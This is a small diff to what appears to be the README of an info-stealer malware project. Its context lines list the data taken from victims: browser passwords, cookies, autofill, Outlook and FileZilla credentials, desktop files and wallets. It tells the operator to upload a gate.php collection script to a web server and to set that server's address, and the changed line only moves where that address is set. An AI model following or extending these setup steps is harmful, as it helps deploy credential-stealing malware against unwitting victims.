@@ -5,7 +5,7 @@ Chrome, Opera ,Chromium ,Edge ,Firefox, IE passwords, cookies , bookmarks , auto
 , vault , Outlook passwords , Filezilla , desktop files  ,wallets
 
 Upload  gate.php  to  web server .
-Change the web server address http://localhost/gate.php in file Stealer.cs
+Change the web server address http://localhost/gate.php in file Program.cs
 
 
 
